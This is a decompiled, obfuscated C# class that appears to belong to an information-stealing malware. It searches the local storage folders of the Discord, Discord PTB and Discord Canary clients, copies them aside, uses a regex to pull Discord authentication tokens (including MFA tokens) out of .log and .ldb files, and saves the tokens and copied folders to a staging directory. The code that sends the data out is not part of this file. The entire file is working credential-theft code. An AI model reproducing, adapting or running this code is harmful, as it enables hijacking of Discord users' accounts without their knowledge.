using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;

internal class Class30
{
	private static Regex regex_0 = new Regex("[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_\\-]{27}|mfa\\.[a-zA-Z0-9_\\-]{84}");

	private static string[] string_0 = new string[3] { "Discord\\Local Storage\\leveldb", "Discord PTB\\Local Storage\\leveldb", "Discord Canary\\leveldb" };

	public static void smethod_0()
	{
		try
		{
			string text = Class38.string_11 + "\\Discord";
			string[] array = smethod_2();
			if (array.Length != 0)
			{
				Directory.CreateDirectory(text);
				string[] array2 = array;
				foreach (string text2 in array2)
				{
					File.AppendAllText(text + "\\Tokens.txt", text2 + "\n");
				}
			}
			smethod_1();
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
	}

	private static void smethod_1()
	{
		string path = Class38.string_11 + "\\Discord";
		string[] array = string_0;
		foreach (string path2 in array)
		{
			string directoryName = Path.GetDirectoryName(Path.Combine(Class52.string_3, path2));
			string string_ = Path.Combine(path, new DirectoryInfo(directoryName).Name);
			if (Directory.Exists(directoryName))
			{
				try
				{
					Class29.smethod_1(directoryName, string_);
					Class36.int_8++;
				}
				catch
				{
				}
				continue;
			}
			break;
		}
	}

	public static string[] smethod_2()
	{
		List<string> list = new List<string>();
		try
		{
			string[] array = string_0;
			foreach (string path in array)
			{
				string path2 = Path.Combine(Class52.string_3, path);
				string text = Path.Combine(Path.GetTempPath(), new DirectoryInfo(path2).Name);
				if (!Directory.Exists(path2))
				{
					continue;
				}
				Class29.smethod_1(path2, text);
				string[] files = Directory.GetFiles(text);
				foreach (string text2 in files)
				{
					if (text2.EndsWith(".log") || text2.EndsWith(".ldb"))
					{
						string input = File.ReadAllText(text2);
						Match match = regex_0.Match(input);
						if (match.Success)
						{
							list.Add(match.Value ?? "");
						}
						Class36.int_8++;
					}
				}
				Class29.smethod_0(text);
			}
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
		return list.ToArray();
	}
}
